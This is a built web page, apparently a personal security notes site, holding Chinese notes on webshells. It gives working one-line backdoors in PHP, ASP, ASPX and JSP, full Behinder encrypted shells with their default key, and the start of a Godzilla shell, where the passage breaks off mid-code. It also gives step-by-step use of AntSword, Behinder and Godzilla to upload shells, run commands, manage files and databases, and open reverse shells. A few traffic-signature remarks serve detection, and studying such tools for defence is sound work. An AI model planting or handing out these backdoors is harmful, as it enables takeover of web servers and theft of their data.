import{_ as a}from"./plugin-vue_export-helper-x3n3nnut.js";import{o as n,c as s,e}from"./app-JL9npEXI.js";const t="/DailyNotes/assets/image-20230815141739231-EGWMgtc_.png",p="/DailyNotes/assets/image-20230815140202778-waRKsyVE.png",i="/DailyNotes/assets/image-20230810161246585-yPDacHsV.png",o="/DailyNotes/assets/image-20230810161645463-oqagFGNS.png",l="/DailyNotes/assets/image-20230814100429716-51hRA2Tz.png",c="/DailyNotes/assets/image-20230814101022263-5wEaUNfq.png",u="/DailyNotes/assets/image-20230814101129511-lujqtuhO.png",r="/DailyNotes/assets/image-20230814101308245-KRkGUHXc.png",d="/DailyNotes/assets/image-20230814101354396-fDPuUTzq.png",g="/DailyNotes/assets/image-20230814102523579-uum5w9--.png",k="/DailyNotes/assets/image-20230814102856901-v4u2viy2.png",m="/DailyNotes/assets/image-20230814102939876-gFYfd3Ha.png",b="/DailyNotes/assets/image-20230814104549589-z0nsvWJz.png",v="/DailyNotes/assets/image-20230814104756732-ovTaIWs1.png",f="/DailyNotes/assets/image-20230815140737346-lUwTyOqV.png",h="/DailyNotes/assets/image-20230815140901874-yemmKFnz.png",y="/DailyNotes/assets/image-20230815141340336-815fFty4.png",_="/DailyNotes/assets/image-20230815141103112-_Pyl-wsl.png",x="/DailyNotes/assets/image-20230814110613830-s5mjYY2G.png",w="/DailyNotes/assets/image-20230814144237044-LY1pMsju.png",q="/DailyNotes/assets/image-20230815135824974-TX4I9IIB.png",$="/DailyNotes/assets/image-20230815165140852-VlhJ1Sin.png",S="/DailyNotes/assets/image-20230815165240153--OlwTmAp.png",z="/DailyNotes/assets/image-20230815164940653-OVJBiAir.png",D="/DailyNotes/assets/image-20230815165508299-2SOwnEgk.png",N="/DailyNotes/assets/image-20230815165549249-dFsCn7WN.png",P="/DailyNotes/assets/image-20230815165647113-P9oCd6Sr.png",j="/DailyNotes/assets/image-20230815165830937-BL6M5UeT.png",W="/DailyNotes/assets/image-20230815170015117-9DqvvaD1.png",A="/DailyNotes/assets/image-20230815170118557-_ML4cOwj.png",C="/DailyNotes/assets/image-20230815170731689-Osc1bugj.png",E="/DailyNotes/assets/image-20230815180414912-lCxqox07.png",I="/DailyNotes/assets/image-20230815180428861-nI08HbZQ.png",O="/DailyNotes/assets/image-20230815171655564-JYfr3N61.png",B="/DailyNotes/assets/image-20230815142844497-hGPQgkXj.png",T="/DailyNotes/assets/image-20230815143232725-Z46UZF6F.png",R="/DailyNotes/assets/image-20230815144327087-1j_nZGC1.png",H="/DailyNotes/assets/image-20230815145351133-9v9GAUgM.png",G="/DailyNotes/assets/image-20230815153411326-wT746oDs.png",L="/DailyNotes/assets/image-20230815153435464-HEaMJAkg.png",J="/DailyNotes/assets/image-20230815153523504-3n5PPbdQ.png",U="/DailyNotes/assets/image-20230815153706351-jIukOo7q.png",K="/DailyNotes/assets/image-20230815153759373-6g3axA2d.png",M="/DailyNotes/assets/image-20230815153839913-DXYUH0dY.png",V="/DailyNotes/assets/image-20230815153925634-G_gs_IRs.png",X="/DailyNotes/assets/image-20230815142532681-J5sKn92c.png",Q="/DailyNotes/assets/image-20230815155547928-9A-G-aJS.png",Y="/DailyNotes/assets/image-20230816103328924-seA-Jqjb.png",F="/DailyNotes/assets/image-20230816103605171-E15xp3Cj.png",Z="/DailyNotes/assets/image-20230816103757195-Zxfd8eK6.png",aa="/DailyNotes/assets/image-20230816103939266-Al2IUiv0.png",na="/DailyNotes/assets/image-20230815152114365-ooH3ajJM.png",sa="/DailyNotes/assets/image-20230815152813461-Q-APoIQ9.png",ea="/DailyNotes/assets/image-20230816121318426-1rgzP8uB.png",ta="/DailyNotes/assets/image-20230612162825691-QYCyN_z5.png",pa="/DailyNotes/assets/image-20230530171344861-aQj5eqQR.png",ia="/DailyNotes/assets/image-20230530175337954-7KC0rGW9.png",oa="/DailyNotes/assets/image-20230530171838366-n5iAHNKJ.png",la="/DailyNotes/assets/image-20230530174748026-ctRI6ox_.png",ca="/DailyNotes/assets/image-20230530181115185-60xrb99W.png",ua={},ra=e(`<h1 id="webshell相关知识整理" tabindex="-1"><a class="header-anchor" href="#webshell相关知识整理" aria-hidden="true">#</a> WebShell相关知识整理</h1><h2 id="webshell简介" tabindex="-1"><a class="header-anchor" href="#webshell简介" aria-hidden="true">#</a> WebShell简介</h2><h3 id="概念" tabindex="-1"><a class="header-anchor" href="#概念" aria-hidden="true">#</a> 概念</h3><p>从名字来看Web指的是网页服务，Shell指的是计算机程序运行的指令命令。</p><p>WebShell通常是一个命令执行环境，其形式为ASP、ASPX、PHP、JSP等，还有比较特殊的无文件落地的内存马，也称为Web后门。黑客通常利用常见的漏洞，如文件上传漏洞、反序列化、SQL注入、远程文件包含、FTP，甚至使用跨站脚本攻击(XSS)等方式入侵网站，将WebShell后门文件放置网站服务器的Web目录中(或直接注入内存马)，然后利用浏览器或WebShell管理工具访问这些后门，获取命令执行环境，从而控制网站或Web服务器。</p><blockquote><p>下面如无特殊说明，WebShell均指普通的有文件的WebShell。</p></blockquote><p>以php语言为例，简单的一句话木马<code>demo.php</code>如下：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>&lt;?php @eval($_GET[&quot;cmd&quot;]); ?&gt;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>上面的代码含义是：<code>eval() </code>函数会获取 <code>cmd </code>参数中代码来执行，将该文件放到目标网站的Web目录下，如访问<code>http://ip:port/demo.php?cmd=echo &#39;hello,world!&#39;;</code> ，结果会打印出 <code>hello world!</code></p><p>可以通过访问该文件实现对网站服务器进行操控，包括执行系统命令、读取数据库、删除文件、修改主页等都可以做到。这样一个简单的语句就可以为黑客入侵打开一扇大门，让黑客可以随意地执行任意代码。</p><h3 id="利用前提" tabindex="-1"><a class="header-anchor" href="#利用前提" aria-hidden="true">#</a> 利用前提</h3><ul><li>WebShell可以被放置在服务器的Web目录</li><li>知道WebShell文件的具体位置及文件名并且能访问到</li><li>WebShell能被服务器解析执行</li><li>文件没有被杀毒软件查杀</li></ul><h3 id="分类" tabindex="-1"><a class="header-anchor" href="#分类" aria-hidden="true">#</a> 分类</h3><ul><li>按照功能的多少，一般分为大马、小马、一句话木马三种：</li></ul><p>大马：大马WebShell功能齐全，通常由多个文件组成，包括木马核心、二进制文件、配置文件等，能够管理数据库、文件管理、对站点进行快速的信息收集，甚至能够提权。由于这种大型木马的体量比较大，上传过程中容易被检测且不方便进行上传绕过测试。</p><p>小马：我们在上传文件的时候，可能会出现被限制上传的文件大小或是被拦截的情况，那么可以通过小马来上传大马，小马的功能通常是围绕文件管理的功能（文件上传、文件修改、新建文件等）</p><p>一句话木马：短小精悍、功能强大、隐蔽性好、使用客户端可以快速管理WebShell。</p><p>小马拉大马这个阶段使用的木马都是将功能函数写死在木马文件中，然后执行固定的功能，而一句话木马的原理则是在服务端就一句话，然后使用蚁剑等客户端通过发送功能函数到服务端，服务端将功能函数进行执行并将结果返回给客户端，然后解析并显示结果，这就是这两种阶段的核心区别。</p><ul><li>按照脚本编写语言分类，可以分为PHP(文件后缀.php)、ASP(文件后缀.asp)、JSP(文件后缀.jsp)、ASP.NET(文件后缀.aspx)、PYTHON(文件后缀.py)、CGI(文件后缀.pl .cgi)等</li></ul><p>常见的基础的一句话木马如下：</p><p>php</p><div class="language-php line-numbers-mode" data-ext="php"><pre class="language-php"><code><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> @<span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">&#39;password&#39;</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?&gt;</span></span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>asp</p><div class="language-asp line-numbers-mode" data-ext="asp"><pre class="language-asp"><code>&lt;%execute request(&quot;password&quot;)%&gt;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>aspx</p><div class="language-aspx line-numbers-mode" data-ext="aspx"><pre class="language-aspx"><code>&lt;%@ Page Language=&quot;Jscript&quot;%&gt;&lt;%eval(Request.Item[&quot;password&quot;],&quot;unsafe&quot;);%&gt;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>jsp无回显</p><div class="language-jsp line-numbers-mode" data-ext="jsp"><pre class="language-jsp"><code>&lt;%Runtime.getRuntime().exec(request.getParameter(&quot;password&quot;));%&gt;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>jsp有回显</p><div class="language-jsp line-numbers-mode" data-ext="jsp"><pre class="language-jsp"><code>&lt;%
    if(&quot;023&quot;.equals(request.getParameter(&quot;pwd&quot;))){
        java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter(&quot;password&quot;)).getInputStream();
        int a = -1;
        byte[] b = new byte[2048];
        out.print(&quot;&lt;pre&gt;&quot;);
        while((a=in.read(b))!=-1){
            out.println(new String(b));
        }
        out.print(&quot;&lt;/pre&gt;&quot;);
    }
%&gt;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h2 id="webshell管理工具" tabindex="-1"><a class="header-anchor" href="#webshell管理工具" aria-hidden="true">#</a> WebShell管理工具</h2><h3 id="_1-蚁剑-antsword" tabindex="-1"><a class="header-anchor" href="#_1-蚁剑-antsword" aria-hidden="true">#</a> 1. 蚁剑(AntSword)</h3><p>AntSword是一个开放源代码，跨平台的网站管理工具，旨在满足渗透测试人员以及有授权的安全研究人员以及网站管理员的需求。</p><p>github项目地址：https://github.com/AntSwordProject/antSword</p><p>官方加载器： https://github.com/AntSwordProject/AntSword-Loader</p><p>具体使用可以参考：https://www.yuque.com/antswordproject/antsword/lmwppk</p><figure><img src="`+t+'" alt="image-20230815141739231" tabindex="0" loading="lazy"><figcaption>image-20230815141739231</figcaption></figure><p><strong>蚁剑支持的webshell类型如下：</strong></p><figure><img src="'+p+'" alt="image-20230815140202778" tabindex="0" loading="lazy"><figcaption>image-20230815140202778</figcaption></figure><h4 id="安装步骤" tabindex="-1"><a class="header-anchor" href="#安装步骤" aria-hidden="true">#</a> 安装步骤</h4><p>1、下载源码和加载器两个文件并解压</p><p>2、进入loader文件夹，运行名为AntSword的可执行文件</p><figure><img src="'+i+'" alt="image-20230810161246585" tabindex="0" loading="lazy"><figcaption>image-20230810161246585</figcaption></figure><p>3、点击初始化，选择前面解压好的源码文件夹</p><figure><img src="'+o+'" alt="image-20230810161645463" tabindex="0" loading="lazy"><figcaption>image-20230810161645463</figcaption></figure><p>4、等待一会，安装完成，后面使用直接点击步骤1中的文件即可开启。</p><h4 id="基本使用" tabindex="-1"><a class="header-anchor" href="#基本使用" aria-hidden="true">#</a> 基本使用</h4><p>1、将WebShell上传到服务器</p><figure><img src="'+l+'" alt="image-20230814100429716" tabindex="0" loading="lazy"><figcaption>image-20230814100429716</figcaption></figure><p>2、使用蚁剑连接</p><figure><img src="'+c+'" alt="image-20230814101022263" tabindex="0" loading="lazy"><figcaption>image-20230814101022263</figcaption></figure><p>3、连接成功后即可右键选择</p><figure><img src="'+u+'" alt="image-20230814101129511" tabindex="0" loading="lazy"><figcaption>image-20230814101129511</figcaption></figure><p><strong>虚拟终端执行命令</strong></p><figure><img src="'+r+'" alt="image-20230814101308245" tabindex="0" loading="lazy"><figcaption>image-20230814101308245</figcaption></figure><p><strong>选择文件管理</strong></p><figure><img src="'+d+'" alt="image-20230814101354396" tabindex="0" loading="lazy"><figcaption>image-20230814101354396</figcaption></figure><p><strong>选择数据操作</strong></p><figure><img src="'+g+'" alt="image-20230814102523579" tabindex="0" loading="lazy"><figcaption>image-20230814102523579</figcaption></figure><p><strong>选择浏览网站</strong></p><figure><img src="'+k+'" alt="image-20230814102856901" tabindex="0" loading="lazy"><figcaption>image-20230814102856901</figcaption></figure><p>还内置了一个cookie记录的功能</p><figure><img src="'+m+'" alt="image-20230814102939876" tabindex="0" loading="lazy"><figcaption>image-20230814102939876</figcaption></figure><p><strong>插件市场</strong></p><p>点击绿色图标即可安装，安装成功后可以在本地仓库查看。</p><figure><img src="'+b+'" alt="image-20230814104549589" tabindex="0" loading="lazy"><figcaption>image-20230814104549589</figcaption></figure><p>插件使用：</p><figure><img src="'+v+'" alt="image-20230814104756732" tabindex="0" loading="lazy"><figcaption>image-20230814104756732</figcaption></figure><p><strong>配置代理</strong></p><figure><img src="'+f+'" alt="image-20230815140737346" tabindex="0" loading="lazy"><figcaption>image-20230815140737346</figcaption></figure><p><strong>编码设置</strong></p><figure><img src="'+h+'" alt="image-20230815140901874" tabindex="0" loading="lazy"><figcaption>image-20230815140901874</figcaption></figure><figure><img src="'+y+'" alt="image-20230815141340336" tabindex="0" loading="lazy"><figcaption>image-20230815141340336</figcaption></figure><p>还可以配置RSA加密</p><figure><img src="'+_+`" alt="image-20230815141103112" tabindex="0" loading="lazy"><figcaption>image-20230815141103112</figcaption></figure><h4 id="流量" tabindex="-1"><a class="header-anchor" href="#流量" aria-hidden="true">#</a> 流量</h4><p><strong>php</strong>马如下：</p><div class="language-php line-numbers-mode" data-ext="php"><pre class="language-php"><code><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> @<span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">&#39;cmd&#39;</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?&gt;</span></span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>流量特征：base64_decode()</p><figure><img src="`+x+`" alt="image-20230814110613830" tabindex="0" loading="lazy"><figcaption>image-20230814110613830</figcaption></figure><p><strong>asp</strong>马如下：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>&lt;%eval request (&quot;pass&quot;)%&gt;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>流量特征：=eval() cute</p><figure><img src="`+w+`" alt="image-20230814144237044" tabindex="0" loading="lazy"><figcaption>image-20230814144237044</figcaption></figure><p><strong>jsp</strong>马如下：</p><div class="language-jsp line-numbers-mode" data-ext="jsp"><pre class="language-jsp"><code>&lt;%!
    class U extends ClassLoader {
        U(ClassLoader c) {
            super(c);
        }
        public Class g(byte[] b) {
            return super.defineClass(b, 0, b.length);
        }
    }

    public byte[] base64Decode(String str) throws Exception {
        try {
            Class clazz = Class.forName(&quot;sun.misc.BASE64Decoder&quot;);
            return (byte[]) clazz.getMethod(&quot;decodeBuffer&quot;, String.class).invoke(clazz.newInstance(), str);
        } catch (Exception e) {
            Class clazz = Class.forName(&quot;java.util.Base64&quot;);
            Object decoder = clazz.getMethod(&quot;getDecoder&quot;).invoke(null);
            return (byte[]) decoder.getClass().getMethod(&quot;decode&quot;, String.class).invoke(decoder, str);
        }
    }
%&gt;
&lt;%
    String cls = request.getParameter(&quot;passwd&quot;);
    if (cls != null) {
        new U(this.getClass().getClassLoader()).g(base64Decode(cls)).newInstance().equals(pageContext);
    }
%&gt;

</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><figure><img src="`+q+`" alt="image-20230815135824974" tabindex="0" loading="lazy"><figcaption>image-20230815135824974</figcaption></figure><p>此处passwd=后面的值为class文件的base64编码。</p><h3 id="_2-冰蝎-behinder" tabindex="-1"><a class="header-anchor" href="#_2-冰蝎-behinder" aria-hidden="true">#</a> 2. 冰蝎(Behinder)</h3><p>冰蝎”是一款动态二进制加密网站管理客户端。</p><p>github地址：https://github.com/rebeyond/Behinder</p><p>&quot;冰蝎&quot;客户端基于JAVA，所以可以跨平台使用，23年最新版本为4.0.6，兼容性较之前的版本有较大提升。主要功能为：基本信息、命令执行、虚拟终端、文件管理、Socks代理、反弹shell、数据库管理、自定义代码等，功能非常强大</p><h4 id="安装及使用" tabindex="-1"><a class="header-anchor" href="#安装及使用" aria-hidden="true">#</a> 安装及使用</h4><p>下载冰蝎后，server文件夹内为默认的webshell代码，挑选需要的使用即可。</p><p>以php为例，加密密钥硬编码进了webshell代码里</p><div class="language-php line-numbers-mode" data-ext="php"><pre class="language-php"><code><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
@<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$key</span><span class="token operator">=</span><span class="token string double-quoted-string">&quot;e45e329feb5d925b&quot;</span><span class="token punctuation">;</span> <span class="token comment">//该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond</span>
	<span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">&#39;k&#39;</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token variable">$key</span><span class="token punctuation">;</span>
	<span class="token function">session_write_close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token variable">$post</span><span class="token operator">=</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string double-quoted-string">&quot;php://input&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">extension_loaded</span><span class="token punctuation">(</span><span class="token string single-quoted-string">&#39;openssl&#39;</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
	<span class="token punctuation">{</span>
		<span class="token variable">$t</span><span class="token operator">=</span><span class="token string double-quoted-string">&quot;base64_&quot;</span><span class="token operator">.</span><span class="token string double-quoted-string">&quot;decode&quot;</span><span class="token punctuation">;</span>
		<span class="token variable">$post</span><span class="token operator">=</span><span class="token variable">$t</span><span class="token punctuation">(</span><span class="token variable">$post</span><span class="token operator">.</span><span class="token string double-quoted-string">&quot;&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		
		<span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span><span class="token variable">$i</span><span class="token operator">&lt;</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$post</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    			 <span class="token variable">$post</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$post</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span><span class="token operator">^</span><span class="token variable">$key</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token operator">+</span><span class="token number">1</span><span class="token operator">&amp;</span><span class="token number">15</span><span class="token punctuation">]</span><span class="token punctuation">;</span> 
    			<span class="token punctuation">}</span>
	<span class="token punctuation">}</span>
	<span class="token keyword">else</span>
	<span class="token punctuation">{</span>
		<span class="token variable">$post</span><span class="token operator">=</span><span class="token function">openssl_decrypt</span><span class="token punctuation">(</span><span class="token variable">$post</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">&quot;AES128&quot;</span><span class="token punctuation">,</span> <span class="token variable">$key</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span>
    <span class="token variable">$arr</span><span class="token operator">=</span><span class="token function">explode</span><span class="token punctuation">(</span><span class="token string single-quoted-string">&#39;|&#39;</span><span class="token punctuation">,</span><span class="token variable">$post</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$func</span><span class="token operator">=</span><span class="token variable">$arr</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token variable">$params</span><span class="token operator">=</span><span class="token variable">$arr</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
	<span class="token keyword">class</span> <span class="token class-name-definition class-name">C</span><span class="token punctuation">{</span><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__invoke</span><span class="token punctuation">(</span><span class="token variable">$p</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$p</span><span class="token operator">.</span><span class="token string double-quoted-string">&quot;&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">}</span>
    @<span class="token function">call_user_func</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">C</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token variable">$params</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token delimiter important">?&gt;</span></span>

</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>jsp</p><div class="language-jsp line-numbers-mode" data-ext="jsp"><pre class="language-jsp"><code>&lt;% @page import=&quot;java.util.*,javax.crypto.*,javax.crypto.spec.*&quot; %&gt;
&lt;% !class U extends ClassLoader { 
    U(ClassLoader c) { 
        super(c); 
    } 
    public Class g(byte []b) { 
        return super.defineClass(b, 0, b.length); 
    } 
} 
%&gt;
&lt;% if (request.getMethod().equals(&quot;POST&quot;)) {
    String k = &quot;e45e329feb5d925b&quot;;/*该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond*/
    session.putValue(&quot;u&quot;, k);
    Cipher c = Cipher.getInstance(&quot;AES&quot;); 
    c.init(2, new SecretKeySpec(k.getBytes(), &quot;AES&quot;)); 
    new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext); 
}
%&gt;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>文件上传步骤同上，右键-新增，填写好webshell信息</p><figure><img src="`+$+'" alt="image-20230815165140852" tabindex="0" loading="lazy"><figcaption>image-20230815165140852</figcaption></figure><p>点击保存即可。右键可以打开，信息若填写正确，右侧的状态一栏，会出现绿色点</p><figure><img src="'+S+'" alt="image-20230815165240153" tabindex="0" loading="lazy"><figcaption>image-20230815165240153</figcaption></figure><figure><img src="'+z+'" alt="image-20230815164940653" tabindex="0" loading="lazy"><figcaption>image-20230815164940653</figcaption></figure><p>命令执行</p><figure><img src="'+D+'" alt="image-20230815165508299" tabindex="0" loading="lazy"><figcaption>image-20230815165508299</figcaption></figure><p>虚拟终端</p><figure><img src="'+N+'" alt="image-20230815165549249" tabindex="0" loading="lazy"><figcaption>image-20230815165549249</figcaption></figure><p>文件管理</p><figure><img src="'+P+'" alt="image-20230815165647113" tabindex="0" loading="lazy"><figcaption>image-20230815165647113</figcaption></figure><p>内网穿透</p><figure><img src="'+j+'" alt="image-20230815165830937" tabindex="0" loading="lazy"><figcaption>image-20230815165830937</figcaption></figure><p>反弹shell</p><figure><img src="'+W+'" alt="image-20230815170015117" tabindex="0" loading="lazy"><figcaption>image-20230815170015117</figcaption></figure><p>数据库管理</p><figure><img src="'+A+'" alt="image-20230815170118557" tabindex="0" loading="lazy"><figcaption>image-20230815170118557</figcaption></figure><p>平行空间</p><figure><img src="'+C+'" alt="image-20230815170731689" tabindex="0" loading="lazy"><figcaption>image-20230815170731689</figcaption></figure><p>注入内存马（仅java）</p><figure><img src="'+E+'" alt="image-20230815180414912" tabindex="0" loading="lazy"><figcaption>image-20230815180414912</figcaption></figure><figure><img src="'+I+'" alt="image-20230815180428861" tabindex="0" loading="lazy"><figcaption>image-20230815180428861</figcaption></figure><h4 id="流量-1" tabindex="-1"><a class="header-anchor" href="#流量-1" aria-hidden="true">#</a> 流量</h4><p>AES加密的</p><figure><img src="'+O+`" alt="image-20230815171655564" tabindex="0" loading="lazy"><figcaption>image-20230815171655564</figcaption></figure><h3 id="_3-哥斯拉-godzilla" tabindex="-1"><a class="header-anchor" href="#_3-哥斯拉-godzilla" aria-hidden="true">#</a> 3. 哥斯拉(Godzilla)</h3><p>支持jsp、php、aspx等多种载荷，java和c#的载荷原生实现AES加密，PHP使用异或加密。</p><p>github项目地址：https://github.com/BeichenDream/Godzilla/releases/download/v4.0.1-godzilla/godzilla.jar</p><h4 id="安装及使用-1" tabindex="-1"><a class="header-anchor" href="#安装及使用-1" aria-hidden="true">#</a> 安装及使用</h4><p>下载后直接执行如下命令即可运行</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>java -jar godzilla.jar
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>Godzilla支持的webshell类型如下：</p><figure><img src="`+B+'" alt="image-20230815142844497" tabindex="0" loading="lazy"><figcaption>image-20230815142844497</figcaption></figure><p>首先用Godzilla生成payload</p><figure><img src="'+T+`" alt="image-20230815143232725" tabindex="0" loading="lazy"><figcaption>image-20230815143232725</figcaption></figure><p>PHP_EVAL_XOR_BASE64生成的php文件：</p><div class="language-php line-numbers-mode" data-ext="php"><pre class="language-php"><code><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string double-quoted-string">&quot;pass&quot;</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</span></code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><p>PHP_XOR_BASE64</p><div class="language-php line-numbers-mode" data-ext="php"><pre class="language-php"><code><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
@<span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
@<span class="token function">set_time_limit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
@<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">function</span> <span class="token function-definition function">encode</span><span class="token punctuation">(</span><span class="token variable">$D</span><span class="token punctuation">,</span><span class="token variable">$K</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span><span class="token variable">$i</span><span class="token operator">&lt;</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$D</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token variable">$c</span> <span class="token operator">=</span> <span class="token variable">$K</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token operator">+</span><span class="token number">1</span><span class="token operator">&amp;</span><span class="token number">15</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token variable">$D</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$D</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span><span class="token operator">^</span><span class="token variable">$c</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">return</span> <span class="token variable">$D</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token variable">$pass</span><span class="token operator">=</span><span class="token string single-quoted-string">&#39;pass&#39;</span><span class="token punctuation">;</span>
<span class="token variable">$payloadName</span><span class="token operator">=</span><span class="token string single-quoted-string">&#39;payload&#39;</span><span class="token punctuation">;</span>
<span class="token variable">$key</span><span class="token operator">=</span><span class="token string single-quoted-string">&#39;3c6e0b8a9c15224a&#39;</span><span class="token punctuation">;</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token variable">$pass</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
